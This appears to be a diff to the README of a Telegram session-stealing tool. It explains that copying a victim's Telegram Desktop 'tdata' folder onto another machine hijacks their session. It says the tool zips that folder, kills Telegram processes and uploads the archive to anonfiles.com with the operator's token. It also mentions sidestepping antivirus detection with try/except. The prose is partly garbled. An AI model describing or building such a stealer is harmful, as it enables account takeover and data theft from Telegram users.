@@ -44,6 +44,16 @@ ________________________________________________________________________________
 The recording session in Telegram is stored locally in this particular path 
 `C:\Users<pc name >\AppData\Roaming\Telegram Desktop`
 in the 'tedata' folder
+```
+C:
+└── Users
+    ├── .AppData
+    │   └── Roaming
+    │       └── TelegramDesktop
+    │           └── tdata
+
+
+
 Once you have moved this folder with all its contents on your device in the same path, then you do what will happen for it is that simple
 The tool does all this, all you have to do is give it your token on the site `https://anonfiles.com/`
 The first step is to go to the path where the tdata file is located, and then convert it to a zip file. Of course, if the Telegram was working, this would not happen. If there was any error, it means that the Telegram is open, so I would do the kill processes. antivirus You will see that this is malicious behavior, so I avoided this part at all by the try and except in the code
